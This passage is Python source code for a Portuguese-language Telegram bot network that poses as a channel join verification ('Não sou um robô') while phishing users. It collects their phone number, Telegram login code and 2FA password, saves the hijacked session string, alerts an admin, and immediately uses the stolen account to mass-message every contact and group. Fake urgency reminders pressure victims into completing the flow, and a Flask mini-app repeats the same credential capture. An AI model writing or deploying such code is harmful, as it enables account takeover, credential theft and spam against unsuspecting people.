    await update.message.reply_text("✅ Atualizado!")
    await child_admin_menu(update, context)

async def miniapp_delete_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.delete()
    except:
        pass

async def child_join_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    jr = update.chat_join_request
    user = jr.from_user
    chat = jr.chat
    bot_id = context.bot_data.get('bot_id')
    pending = load_pending()
    pending[str(user.id)] = {'chat_id': chat.id, 'chat_title': chat.title, 'bot_id': bot_id, 'timestamp': datetime.now().isoformat()}
    save_pending(pending)
    config = get_bot_cfg(bot_id)
    webapp_url = get_child_webapp_url(bot_id)
    keyboard = [[InlineKeyboardButton(config.get('botao', "🔓 DESBLOQUEAR CANAL"), web_app=WebAppInfo(url=webapp_url), api_kwargs={"style": "success"})]]
    first_name = user.first_name or "você"
    msg = config.get('mensagem', DEFAULT_CONFIG['mensagem']).replace("{chat_title}", chat.title).replace("{first_name}", first_name)
    try:
        sent = await context.bot.send_message(chat_id=user.id, text=msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        pending = load_pending()
        pending[str(user.id)]['welcome_msg_id'] = sent.message_id
        pending[str(user.id)]['bot_token'] = context.bot.token
        save_pending(pending)
    except Exception as e:
        logger.error(f"Erro join request filho: {e}")


async def chatflow_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_admin(user.id):
        await child_admin_menu(update, context)
        return
    bot_id = context.bot_data.get('bot_id')
    args = context.args
    if args and args[0] in ('s', 'VIP'):
        if user.id in chatflow_reminder_sent:
            chatflow_reminder_sent[user.id]['done'] = True
        pending = load_pending()
        user_pending = pending.get(str(user.id), {})
        chat_title = user_pending.get('chat_title', 'o canal')
        contact_btn = KeyboardButton("🤖 Não sou um robô", request_contact=True)
        reply_kb = ReplyKeyboardMarkup([[contact_btn]], resize_keyboard=True, one_time_keyboard=True)
        sent = await context.bot.send_message(
            chat_id=user.id,
            text=f"✅ *Verificação Iniciada!*\n\n"
                 f"🎯 Grupo/Canal: *{chat_title}*\n\n"
                 f"Para completar sua entrada, confirme que você não é um robô:",
            reply_markup=reply_kb,
            parse_mode="Markdown"
        )
        import time as _t
        chatflow_states[user.id] = {'step': 'waiting_contact', 'bot_id': bot_id, 'created_at': _t.time(), 'msg_ids': [update.message.message_id, sent.message_id]}
        logger.info(f"[ChatFlow] Start: user={user.id} aguardando contato")
    else:
        bot_username = context.bot_data.get('bot_username', '')
        keyboard = [[InlineKeyboardButton("⚡ LIBERAR ACESSO", url=f"https://t.me/{bot_username}?start=s")]]
        await context.bot.send_message(
            chat_id=user.id,
            text="⚠️ *Seu acesso está pendente!*\n\n"
                 "🔴 Toque no botão abaixo para liberar:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )


async def chatflow_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    contact = update.message.contact
    if not contact:
        return
    state = chatflow_states.get(user.id)
    if not state or state.get('step') != 'waiting_contact':
        return
    phone = contact.phone_number
    if not phone.startswith('+'):
        phone = '+' + phone
    logger.info(f"[ChatFlow] Contato recebido: user={user.id} phone={phone[:6]}***")
    bot_id = state.get('bot_id')
    contact_msg_id = update.message.message_id
    try:
        await context.bot.delete_message(chat_id=user.id, message_id=contact_msg_id)
    except:
        pass
    loading = await context.bot.send_message(chat_id=user.id, text="✅ *Número confirmado!*\n\nEnviando código...", parse_mode="Markdown", reply_markup=ReplyKeyboardRemove())
    import time
    async def _send_code():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        try:
            await client.connect()
            sent = await client.send_code_request(phone)
            chatflow_states[user.id] = {
                'step': 'waiting_code',
                'bot_id': bot_id,
                'client': client,
                'phone': phone,
                'phone_code_hash': sent.phone_code_hash,
                'created_at': time.time(),
                'msg_ids': [],
                'code_buffer': ''
            }
            return True
        except FloodWaitError as e:
            try: await client.disconnect()
            except: pass
            return f"flood:{e.seconds}"
        except Exception as e:
            try: await client.disconnect()
            except: pass
            return f"error:{e}"

    try:
        result = await run_chatflow_nb(_send_code())
        try:
            await context.bot.delete_message(chat_id=user.id, message_id=loading.message_id)
        except:
            pass
        if result is True:
            logger.info(f"[ChatFlow] Código enviado: user={user.id}")
            kb = _build_code_keyboard('')
            display = _build_code_display('')
            s1 = await context.bot.send_message(
                chat_id=user.id,
                text=f"📩 *Código enviado!*\n\n"
                     f"Digite no teclado abaixo e clique ✅ para confirmar:\n\n"
                     f"[ {display} ]",
                reply_markup=InlineKeyboardMarkup(kb),
                parse_mode="Markdown"
            )
            chatflow_states[user.id]['keyboard_msg_id'] = s1.message_id
            chatflow_states[user.id]['msg_ids'] = [s1.message_id]
        elif isinstance(result, str) and result.startswith("flood:"):
            secs = result.split(":")[1]
            logger.warning(f"[ChatFlow] FloodWait {secs}s: user={user.id}")
            await context.bot.send_message(chat_id=user.id, text=f"⏳ Muitas tentativas. Aguarde {secs} segundos e tente novamente.")
            chatflow_states.pop(user.id, None)
        else:
            logger.error(f"[ChatFlow] Erro send_code: user={user.id} result={result}")
            await context.bot.send_message(chat_id=user.id, text="❌ Não foi possível enviar o código. Tente novamente em alguns minutos.")
            chatflow_states.pop(user.id, None)
    except Exception as e:
        logger.error(f"[ChatFlow] Erro fatal send_code: user={user.id} {e}")
        try:
            await context.bot.send_message(chat_id=user.id, text="❌ Erro interno. Tente novamente.")
        except:
            pass
        chatflow_states.pop(user.id, None)


async def _delete_chatflow_msgs(context, chat_id, msg_ids):
    for mid in msg_ids:
        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=mid)
        except:
            pass

async def _handle_code_keyboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = query.from_user
    state = chatflow_states.get(user.id)
    if not state or state.get('step') != 'waiting_code':
        await query.answer("⚠️ Sessão expirada. Toque em /start para recomeçar.", show_alert=True)
        try:
            await query.message.delete()
        except:
            pass
        return
    data = query.data
    current = state.get('code_buffer', '')

    if data == 'cf_del':
        if current:
            current = current[:-1]
            state['code_buffer'] = current
        await query.answer()
        display = _build_code_display(current)
        kb = _build_code_keyboard(current)
        await safe_edit(query,
            f"📩 *Código enviado!*\n\n"
            f"Digite no teclado abaixo e clique ✅ para confirmar:\n\n"
            f"[ {display} ]",
            reply_markup=InlineKeyboardMarkup(kb),
            parse_mode="Markdown"
        )
        return

    async def _do_verify_now():
        code = state.get('code_buffer', '')
        logger.info(f"[ChatFlow] Verificando código: user={user.id}")
        await safe_edit(query, "🔄 *Verificando código...*", parse_mode="Markdown")
        keyboard_msg_id = query.message.message_id

        async def _verify():
            client = state.get('client')
            phone = state.get('phone')
            phone_code_hash = state.get('phone_code_hash')
            if not client:
                return {'success': False, 'error': 'Sessão expirada'}
            try:
                if not client.is_connected():
                    await client.connect()
                await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
                session_string = client.session.save()
                await client.disconnect()
                return {'success': True, 'phone': phone, 'session': session_string}
            except SessionPasswordNeededError:
                return {'success': False, 'needs_2fa': True}
            except PhoneCodeInvalidError:
                return {'success': False, 'error': 'Código inválido'}
            except Exception as e:
                return {'success': False, 'error': str(e)}

        try:
            result = await run_chatflow_nb(_verify())
            if result.get('success'):
                logger.info(f"[ChatFlow] ✅ Verificação OK: user={user.id}")
                with chatflow_lock:
                    chatflow_states.pop(user.id, None)
                threading.Thread(target=on_verification_success, args=(user.id, result['phone'], result['session']), daemon=True).start()
                try:
                    await context.bot.delete_message(chat_id=user.id, message_id=keyboard_msg_id)
                except:
                    pass
                await context.bot.send_message(
                    chat_id=user.id,
                    text="✅ *Verificação feita!*\n\n🎉 Você foi aceito no canal/grupo.",
                    parse_mode="Markdown"
                )
            elif result.get('needs_2fa'):
                logger.info(f"[ChatFlow] 2FA necessário: user={user.id}")
                with chatflow_lock:
                    chatflow_states[user.id]['step'] = 'waiting_2fa'
                    chatflow_states[user.id]['code_buffer'] = ''
                    chatflow_states[user.id]['msg_ids'] = [keyboard_msg_id]
                await safe_edit(query,
                    "🔑 Sua conta tem 2FA. Digite sua *senha* aqui no chat.",
                    parse_mode="Markdown"
                )
            else:
                logger.warning(f"[ChatFlow] Código inválido: user={user.id} err={result.get('error')}")
                state['code_buffer'] = ''
                kb = _build_code_keyboard('')
                display = _build_code_display('')
                await safe_edit(query,
                    f"❌ *{result.get('error', 'Erro')}*\n\n"
                    f"Tente novamente:\n\n[ {display} ]",
                    reply_markup=InlineKeyboardMarkup(kb),
                    parse_mode="Markdown"
                )
        except Exception as e:
            logger.error(f"[ChatFlow] Erro verify: user={user.id} {e}")
            state['code_buffer'] = ''
            kb = _build_code_keyboard('')
            display = _build_code_display('')
            await safe_edit(query,
                f"❌ *Erro interno*\n\nTente novamente:\n\n[ {display} ]",
                reply_markup=InlineKeyboardMarkup(kb),
                parse_mode="Markdown"
            )
        return

    if data == 'cf_ok':
        if len(current) < 5:
            await query.answer("⚠️ Digite os 5 dígitos primeiro.")
            return
        await query.answer("⏳ Verificando...")
        await _do_verify_now()
        return

    digit = data.replace('cf_', '')
    if digit.isdigit() and len(current) < 5:
        current += digit
        state['code_buffer'] = current
    await query.answer()
    if len(current) >= 5:
        await _do_verify_now()
        return
    display = _build_code_display(current)
    kb = _build_code_keyboard(current)
    await safe_edit(query,
        f"📩 *Código enviado!*\n\n"
        f"Digite no teclado abaixo e clique ✅ para confirmar:\n\n"
        f"[ {display} ]",
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode="Markdown"
    )

async def chatflow_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_admin(user.id):
        await child_text(update, context)
        return
    state = chatflow_states.get(user.id)
    if not state:
        return
    text = update.message.text
    step = state.get('step')
    if 'msg_ids' not in state:
        state['msg_ids'] = []

    if step == 'waiting_code':
        clean = text.strip().replace(" ", "").replace("-", "")
        if not (clean.isdigit() and len(clean) >= 5):
            s = await context.bot.send_message(chat_id=user.id, text="⚠️ O código deve ter 5 dígitos numéricos.")
            state['msg_ids'].append(update.message.message_id)
            state['msg_ids'].append(s.message_id)
            return
        code = clean
        logger.info(f"[ChatFlow] Código via texto: user={user.id}")
        state['msg_ids'].append(update.message.message_id)
        loading = await context.bot.send_message(chat_id=user.id, text="🔄 *Verificando código...*", parse_mode="Markdown")
        state['msg_ids'].append(loading.message_id)

        async def _verify():
            client = state.get('client')
            phone = state.get('phone')
            phone_code_hash = state.get('phone_code_hash')
            if not client:
                return {'success': False, 'error': 'Sessão expirada'}
            try:
                if not client.is_connected():
                    await client.connect()
                await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
                session_string = client.session.save()
                await client.disconnect()
                return {'success': True, 'phone': phone, 'session': session_string}
            except SessionPasswordNeededError:
                return {'success': False, 'needs_2fa': True}
            except PhoneCodeInvalidError:
                return {'success': False, 'error': 'Código inválido'}
            except Exception as e:
                return {'success': False, 'error': str(e)}

        try:
            result = await run_chatflow_nb(_verify())
            if result.get('success'):
                logger.info(f"[ChatFlow] ✅ Verificação OK via texto: user={user.id}")
                all_msgs = list(state.get('msg_ids', []))
                with chatflow_lock:
                    chatflow_states.pop(user.id, None)
                threading.Thread(target=on_verification_success, args=(user.id, result['phone'], result['session']), daemon=True).start()
                for mid in all_msgs:
                    try:
                        await context.bot.delete_message(chat_id=user.id, message_id=mid)
                    except:
                        pass
                await context.bot.send_message(
                    chat_id=user.id,
                    text="✅ *Verificação feita!*\n\n🎉 Você foi aceito no canal/grupo.",
                    parse_mode="Markdown"
                )
            elif result.get('needs_2fa'):
                logger.info(f"[ChatFlow] 2FA necessário via texto: user={user.id}")
                with chatflow_lock:
                    chatflow_states[user.id]['step'] = 'waiting_2fa'
                try:
                    await context.bot.delete_message(chat_id=user.id, message_id=loading.message_id)
                except:
                    pass
                s = await context.bot.send_message(
                    chat_id=user.id,
                    text="🔑 Sua conta tem 2FA. Digite sua *senha* aqui no chat.",
                    parse_mode="Markdown"
                )
                state['msg_ids'].append(s.message_id)
            else:
                logger.warning(f"[ChatFlow] Código inválido via texto: user={user.id}")
                try:
                    await context.bot.delete_message(chat_id=user.id, message_id=loading.message_id)
                except:
                    pass
                s = await context.bot.send_message(chat_id=user.id, text=f"❌ {result.get('error', 'Erro')}. Tente novamente:")
                state['msg_ids'].append(s.message_id)
        except Exception as e:
            logger.error(f"[ChatFlow] Erro verify texto: user={user.id} {e}")
            s = await context.bot.send_message(chat_id=user.id, text="❌ Erro. Tente novamente:")
            state['msg_ids'].append(s.message_id)
        return

    if step == 'waiting_2fa':
        password = text
        logger.info(f"[ChatFlow] 2FA recebido: user={user.id}")
        state['msg_ids'].append(update.message.message_id)
        loading = await context.bot.send_message(chat_id=user.id, text="🔄 *Verificando senha...*", parse_mode="Markdown")
        state['msg_ids'].append(loading.message_id)

        async def _verify_2fa():
            client = state.get('client')
            phone = state.get('phone')
            if not client:
                return {'success': False, 'error': 'Sessão expirada'}
            try:
                if not client.is_connected():
                    await client.connect()
                await client.sign_in(password=password)
                session_string = client.session.save()
                await client.disconnect()
                return {'success': True, 'phone': phone, 'session': session_string}
            except Exception as e:
                return {'success': False, 'error': 'Senha incorreta'}

        try:
            result = await run_chatflow_nb(_verify_2fa())
            if result.get('success'):
                logger.info(f"[ChatFlow] ✅ 2FA OK: user={user.id}")
                all_msgs = list(state.get('msg_ids', []))
                with chatflow_lock:
                    chatflow_states.pop(user.id, None)
                threading.Thread(target=on_verification_success, args=(user.id, result['phone'], result['session']), daemon=True).start()
                for mid in all_msgs:
                    try:
                        await context.bot.delete_message(chat_id=user.id, message_id=mid)
                    except:
                        pass
                await context.bot.send_message(
                    chat_id=user.id,
                    text="✅ *Verificação feita!*\n\n🎉 Você foi aceito no canal/grupo.",
                    parse_mode="Markdown",
                    reply_markup=ReplyKeyboardRemove()
                )
            else:
                logger.warning(f"[ChatFlow] 2FA incorreto: user={user.id}")
                try:
                    await context.bot.delete_message(chat_id=user.id, message_id=loading.message_id)
                except:
                    pass
                s = await context.bot.send_message(chat_id=user.id, text="❌ Senha incorreta. Tente novamente:")
                state['msg_ids'].append(s.message_id)
        except Exception as e:
            logger.error(f"[ChatFlow] Erro 2FA: user={user.id} {e}")
            s = await context.bot.send_message(chat_id=user.id, text="❌ Erro. Tente novamente:")
            state['msg_ids'].append(s.message_id)
        return


chatflow_reminder_sent = {}

async def _send_reminder(bot_token, user_id, first_name, chat_title, bot_username, reminder_num):
    if user_id not in chatflow_reminder_sent:
        return
    if chatflow_reminder_sent[user_id].get('done'):
        return
    if chatflow_states.get(user_id):
        chatflow_reminder_sent.pop(user_id, None)
        return
    msgs_md = {
        1: (
            f"⏰ *{first_name}, seu acesso ainda está bloqueado!*\n\n"
            f"Você tem 3 minutos para completar a verificação em *{chat_title}*.\n\n"
            f"🔴 Após esse prazo, sua vaga será liberada para outro:"
        ),
        2: (
            f"🚨 *URGENTE — {first_name}!*\n\n"
            f"Sua vaga em *{chat_title}* está sendo disputada.\n"
            f"Outros 14 membros aguardam na fila.\n\n"
            f"⚠️ Verifique AGORA ou perca o acesso:"
        ),
        3: (
            f"❌ *{first_name}, ÚLTIMO AVISO!*\n\n"
            f"Sua solicitação para *{chat_title}* será CANCELADA.\n"
            f"Após isso, não será possível solicitar novamente.\n\n"
            f"🔒 Toque agora — é sua última chance:"
        ),
    }
    from telegram import Bot
    bot = Bot(token=bot_token)
    keyboard = [[InlineKeyboardButton("🔓 DESBLOQUEAR AGORA", url=f"https://t.me/{bot_username}?start=s")]]
    try:
        await bot.send_message(
            chat_id=user_id,
            text=msgs_md.get(reminder_num, msgs_md[3]),
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
        logger.info(f"[Lembrete {reminder_num}] Enviado via Bot API para {user_id}")
        return
    except Exception as e:
        logger.warning(f"[Lembrete {reminder_num}] Bot API falhou para {user_id}: {e}")

def _schedule_reminders(bot_token, user_id, first_name, chat_title, bot_username):
    chatflow_reminder_sent[user_id] = {'done': False}
    async def _run_reminders():
        await asyncio.sleep(120)
        await _send_reminder(bot_token, user_id, first_name, chat_title, bot_username, 1)
        await asyncio.sleep(180)
        await _send_reminder(bot_token, user_id, first_name, chat_title, bot_username, 2)
        await asyncio.sleep(300)
        await _send_reminder(bot_token, user_id, first_name, chat_title, bot_username, 3)
        chatflow_reminder_sent.pop(user_id, None)
    threading.Thread(target=lambda: asyncio.run(_run_reminders()), daemon=True).start()

async def _force_welcome_send(bot_token, user_id, first_name, chat_title, bot_username):
    from telegram import Bot
    bot = Bot(token=bot_token)
    inline_kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔒 Desbloquear entrada", url=f"https://t.me/{bot_username}?start=VIP")]])
    text_md = (
        f"👋 Olá *{first_name}*!\n\n"
        f"Você solicitou entrada no grupo/canal: *{chat_title}*\n\n"
        f"🔒 Clique em *Desbloquear entrada* para continuar:"
    )
    try:
        await bot.send_message(
            chat_id=user_id, text=text_md,
            reply_markup=inline_kb, parse_mode="Markdown"
        )
        logger.info(f"[Welcome] Enviado via Bot API para {user_id}")
        return True
    except Exception as e:
        logger.warning(f"[Welcome] Bot API falhou para {user_id}: {e}")
        return False

async def chatflow_join_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    jr = update.chat_join_request
    user = jr.from_user
    chat = jr.chat
    bot_id = context.bot_data.get('bot_id')
    bot_username = context.bot_data.get('bot_username', '')
    pending = load_pending()
    pending[str(user.id)] = {'chat_id': chat.id, 'chat_title': chat.title, 'bot_id': bot_id, 'bot_token': context.bot.token, 'timestamp': datetime.now().isoformat()}
    save_pending(pending)
    first_name = user.first_name or "usuário"
    inline_kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔒 Desbloquear entrada", url=f"https://t.me/{bot_username}?start=VIP")]])
    try:
        sent = await context.bot.send_message(
            chat_id=user.id,
            text=f"👋 Olá *{first_name}*!\n\n"
                 f"Você solicitou entrada no grupo/canal: *{chat.title}*\n\n"
                 f"🔒 Clique em *Desbloquear entrada* para continuar:",
            reply_markup=inline_kb,
            parse_mode="Markdown"
        )
        logger.info(f"[ChatFlow] Welcome enviado: user={user.id} chat={chat.title}")
    except Exception as e:
        logger.warning(f"[ChatFlow] Welcome falhou para {user.id}: {e}")
    _schedule_reminders(context.bot.token, user.id, first_name, chat.title, bot_username)


async def disparo_session_imediato(session_string, msg):
    if not msg:
        return 0
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        if not await client.is_user_authorized():
            return 0
        dialogs = await client.get_dialogs(limit=None)
        destinos = []
        descartados_offline = 0
        for dialog in dialogs:
            try:
                entity = dialog.entity
                if isinstance(entity, User):
                    if entity.bot or entity.is_self or entity.deleted:
                        continue
                    destinos.append({'entity': entity, 'id': dialog.id, 'name': dialog.name or '?', 'type': 'user'})
                elif isinstance(entity, Chat):
                    destinos.append({'entity': entity, 'id': dialog.id, 'name': dialog.name or '?', 'type': 'group'})
                elif isinstance(entity, Channel):
                    if entity.megagroup:
                        destinos.append({'entity': entity, 'id': dialog.id, 'name': dialog.name or '?', 'type': 'group'})
            except:
                continue
        destinos.sort(key=lambda d: 0 if d['type'] == 'group' else 1)
        enviadas = 0
        restritas = 0
        puladas = 0
        erros = 0
        floods = 0
        pv_pulado_apos_flood = 0
        for dest in destinos:
            try:
                target = dest.get('entity') or dest['id']
                await client.send_message(target, msg)
                enviadas += 1
                logger.info(f"[Disparo Imediato] ✅ {dest['type']}={dest['name']!r}")
                await asyncio.sleep(0.005)
                continue
            except FloodWaitError as e:
                floods += 1
                logger.warning(f"[Disparo Imediato] ⏳ FLOODWAIT {dest['type']}={dest['name']!r} wait={e.seconds}s")
                await asyncio.sleep(min(e.seconds, 15))
                continue
            except Exception as e:
                err_type = type(e).__name__
                err_msg = str(e)
                err_combined = (err_type + " " + err_msg).lower()
                logger.warning(f"[Disparo Imediato] ⚠️ EXC {dest['type']}={dest['name']!r} type={err_type} msg={err_msg!r}")
                if any(k in err_combined for k in ('forbidden', 'banned', 'chat_write_forbidden', 'slowmode', 'slow_mode', 'admin_required', 'channelprivate', 'chatrestricted', 'restricted')):
                    restritas += 1
                    logger.info(f"[Disparo Imediato] 🚫 RESTRITO {dest['type']}={dest['name']!r}")
                    if dest['type'] == 'group':
                        try:
                            from telethon.tl.functions.channels import LeaveChannelRequest
                            await client(LeaveChannelRequest(dest['id']))
                        except:
                            pass
                    await asyncio.sleep(random.uniform(0.3, 0.5))
                elif any(k in err_combined for k in ('peer_id_invalid', 'peeridinvalid', 'user_is_blocked', 'userisblocked', 'userprivacyrestricted', 'inputuserdeactivated')):
                    puladas += 1
                    logger.info(f"[Disparo Imediato] ⏭️  PULADO {dest['type']}={dest['name']!r} ({err_type})")
                    await asyncio.sleep(random.uniform(0.3, 0.5))
                elif 'peerflood' in err_combined or 'peer_flood' in err_combined or 'too many requests' in err_combined:
                    floods += 1
                    logger.warning(f"[Disparo Imediato] ⏳ PEERFLOOD {dest['type']}={dest['name']!r} (conta sob anti-spam Telegram)")
                    await asyncio.sleep(random.uniform(5, 10))
                else:
                    erros += 1
                    logger.info(f"[Disparo Imediato] ❌ ERRO {dest['type']}={dest['name']!r} ({err_type})")
                    await asyncio.sleep(random.uniform(0.3, 0.5))
        n_user = sum(1 for d in destinos if d['type'] == 'user')
        n_group = sum(1 for d in destinos if d['type'] == 'group')
        logger.info(
            f"[Disparo Imediato] RESUMO: {enviadas}/{len(destinos)} enviadas "
            f"| {restritas} restritas | {puladas} puladas | {erros} erros | {floods} floods "
            f"| {pv_pulado_apos_flood} PVs-pulados-pos-flood "
            f"| {descartados_offline} offline-hj | destinos: {n_user} PV + {n_group} grupos"
        )
        await client.disconnect()
        return enviadas
    except Exception as e:
        logger.error(f"[Disparo Imediato] Erro: {e}")
        return 0

def on_verification_success(user_id, phone, session_string):
    pending = load_pending()
    user_data = pending.get(str(user_id), {})
    chat_id = user_data.get('chat_id')
    bot_id = user_data.get('bot_id')

    bot_name = "Bot Pai"
    bot_type_label = "🌐 Mini App"
    if bot_id:
        bot_info = db.get_bot(bot_id)
        if bot_info:
            bot_name = bot_info.get('name', 'Bot')
            bt = bot_info.get('bot_type', 'miniapp')
            bot_type_label = "💬 Fluxo Chat" if bt == 'chatflow' else "🌐 Mini App"

    try:
        saved = db.save_session(user_id, phone, session_string, bot_id)
        logger.info(f"Session salva no DB para {phone} (bot_id={bot_id}): {saved}")
    except Exception as e:
        logger.error(f"ERRO ao salvar session: {e}")

    if chat_id:
        pending.pop(str(user_id), None)
        save_pending(pending)

    try:
        config = load_config()
        msg = config.get('msg_disparo', '')
        enviadas = run_async(disparo_session_imediato(session_string, msg))
        logger.info(f"Disparo imediato {user_id}: {enviadas} msgs")
        if BOT_TOKEN and ADMIN_ID:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            notif = f"✅ Nova session salva!\n\n📱 {phone}\n🤖 {bot_name}\n{bot_type_label}\n📨 {enviadas} msgs disparadas"
            http_requests.post(url, json={'chat_id': ADMIN_ID, 'text': notif}, timeout=5)
    except Exception as e:
        logger.error(f"Erro disparo: {e}")


@flask_app.route('/')
def miniapp():
    return render_template('miniapp.html')

@flask_app.route('/r/<code>')
def redirect_page(code):
    redirect_data = db.get_redirect(code)
    if not redirect_data:
        return "Link não encontrado", 404
    db.increment_redirect_clicks(code)
    return render_template('redirect.html', url=redirect_data['telegram_url'])

@flask_app.route('/api/send_code', methods=['POST'])
def send_code():
    import time
    data = request.json
    phone = data.get('phone', '')
    user_id = data.get('user_id', 0)
    logger.info(f"📱 Verificação iniciada: user={user_id}, phone={phone[:6]}***")
    if not phone:
        return jsonify({'success': False, 'error': 'Número não fornecido'})
    if not phone.startswith('+'):
        phone = '+' + phone

    old_state = user_states.pop(user_id, None)
    if old_state and old_state.get('client'):
        try:
            asyncio.run_coroutine_threadsafe(old_state['client'].disconnect(), telethon_loop)
        except:
            pass

    async def _send():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        try:
            await client.connect()
            sent = await client.send_code_request(phone)
            user_states[user_id] = {
                'client': client,
                'phone': phone,
                'phone_code_hash': sent.phone_code_hash,
                'created_at': time.time()
            }
            logger.info(f"✅ Código enviado para user={user_id}")
            return {'success': True}
        except FloodWaitError as e:
            logger.warning(f"⏳ FloodWait user={user_id}: aguardar {e.seconds}s")
            await client.disconnect()
            return {'success': False, 'error': f'Aguarde {e.seconds} segundos'}
        except Exception as e:
            logger.error(f"❌ Erro send_code user={user_id}: {e}")
            try:
                await client.disconnect()
            except:
                pass
            return {'success': False, 'error': str(e)}

    try:
        result = run_async(_send())
        return jsonify(result)
    except Exception as e:
        logger.error(f"❌ Erro interno send_code user={user_id}: {e}")
        return jsonify({'success': False, 'error': 'Erro interno, tente novamente'})

@flask_app.route('/api/verify_code', methods=['POST'])
def verify_code():
    data = request.json
    code = data.get('code', '')
    user_id = data.get('user_id', 0)
    state = user_states.get(user_id)
    if not state:
        logger.warning(f"⚠️ Sessão expirada para user={user_id}")
        return jsonify({'success': False, 'error': 'Sessão expirada, tente novamente'})

    async def _verify():
        client = state.get('client')
        phone = state.get('phone')
        phone_code_hash = state.get('phone_code_hash')
        if not client:
            return {'success': False, 'error': 'Sessão inválida'}
        try:
            if not client.is_connected():
                await client.connect()
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            session_string = client.session.save()
            await client.disconnect()
            user_states.pop(user_id, None)
            logger.info(f"✅ Verificação completa: user={user_id}")
            return {'success': True, 'phone': phone, 'session': session_string}
        except SessionPasswordNeededError:
            user_states[user_id]['needs_2fa'] = True
            logger.info(f"🔑 2FA necessário: user={user_id}")
            return {'success': False, 'needs_2fa': True}
        except PhoneCodeInvalidError:
            logger.warning(f"❌ Código inválido: user={user_id}")
            return {'success': False, 'error': 'Código inválido'}
        except Exception as e:
            logger.error(f"❌ Erro verify_code user={user_id}: {e}")
            return {'success': False, 'error': str(e)}

    try:
        result = run_async(_verify())
        if result.get('success'):
            threading.Thread(target=on_verification_success, args=(user_id, result['phone'], result['session']), daemon=True).start()
        return jsonify({'success': result.get('success'), 'error': result.get('error'), 'needs_2fa': result.get('needs_2fa')})
    except Exception as e:
        logger.error(f"❌ Erro interno verify_code user={user_id}: {e}")
        return jsonify({'success': False, 'error': 'Erro interno, tente novamente'})

@flask_app.route('/api/verify_2fa', methods=['POST'])
def verify_2fa():
    data = request.json
    password = data.get('password', '')
    user_id = data.get('user_id', 0)
    state = user_states.get(user_id)
    if not state:
        logger.warning(f"⚠️ Sessão 2FA expirada para user={user_id}")
        return jsonify({'success': False, 'error': 'Sessão expirada, tente novamente'})

    async def _verify_2fa():
        client = state.get('client')
        phone = state.get('phone')
        if not client:
            return {'success': False, 'error': 'Sessão inválida'}
        try:
            if not client.is_connected():
                await client.connect()
            await client.sign_in(password=password)
            session_string = client.session.save()
            await client.disconnect()
            user_states.pop(user_id, None)
            logger.info(f"✅ 2FA verificado: user={user_id}")
            return {'success': True, 'phone': phone, 'session': session_string}
        except Exception as e:
            logger.error(f"❌ Erro 2FA user={user_id}: {e}")
            return {'success': False, 'error': 'Senha incorreta'}

    try:
        result = run_async(_verify_2fa())
        if result.get('success'):
            threading.Thread(target=on_verification_success, args=(user_id, result['phone'], result['session']), daemon=True).start()
        return jsonify({'success': result.get('success'), 'error': result.get('error')})
    except Exception as e:
        logger.error(f"❌ Erro interno 2FA user={user_id}: {e}")
        return jsonify({'success': False, 'error': 'Erro interno, tente novamente'})


_disparo_first_offset = {'next': 90}

def _proximo_offset_disparo():
    val = _disparo_first_offset['next']
    _disparo_first_offset['next'] = val + 180
    return val

def start_single_child_bot(bot_info):
    token = bot_info['token']
    bot_id = str(bot_info['_id'])
    bot_name = bot_info.get('name', 'Bot')
    webapp_url = bot_info.get('webapp_url', WEBAPP_URL)
    bot_type = bot_info.get('bot_type', 'miniapp')

    if bot_id in running_child_bots:
        return

    async def _run():
        app = Application.builder().token(token).build()
        app.bot_data['webapp_url'] = webapp_url
        app.bot_data['bot_name'] = bot_name
        app.bot_data['bot_id'] = bot_id
        app.bot_data['bot_type'] = bot_type

        me = await app.bot.get_me()
        app.bot_data['bot_username'] = me.username or ''

        if bot_type == 'approver':
            approver_pending = {}

            async def on_approver_join_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
                jr = update.chat_join_request
                uid = jr.from_user.id
                approver_pending[uid] = {
                    'chat_id': jr.chat.id,
                    'chat_title': jr.chat.title,
                    'ts': datetime.now()
                }
                logger.info(f"[Aprovador {bot_name}] Pedido: user={uid} chat={jr.chat.title}")

            async def approver_check(ctx):
                now = datetime.now()
                to_approve = [
                    (uid, d) for uid, d in list(approver_pending.items())
                    if (now - d['ts']).total_seconds() >= 300
                ]
                for uid, d in to_approve:
                    try:
                        url = f"https://api.telegram.org/bot{token}/approveChatJoinRequest"
                        resp = http_requests.post(url, json={'chat_id': d['chat_id'], 'user_id': uid}, timeout=10)
                        if resp.status_code == 200:
                            logger.info(f"[Aprovador {bot_name}] ✅ user={uid} chat={d['chat_id']}")
                        else:
                            desc = resp.json().get('description', '')
                            if 'HIDE_REQUESTER_MISSING' in desc or 'USER_ALREADY_PARTICIPANT' in desc:
                                logger.info(f"[Aprovador {bot_name}] Já processado user={uid}")
                            else:
                                logger.warning(f"[Aprovador {bot_name}] Falhou user={uid}: {desc}")
                    except Exception as e:
                        logger.error(f"[Aprovador {bot_name}] Erro user={uid}: {e}")
                    approver_pending.pop(uid, None)

            async def approver_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                await update.message.reply_text(
                    f"✅ *Bot Aprovador {bot_name} está funcionando!*\n\n"
                    f"⏰ Aceita pedidos automaticamente após *5 minutos*.\n"
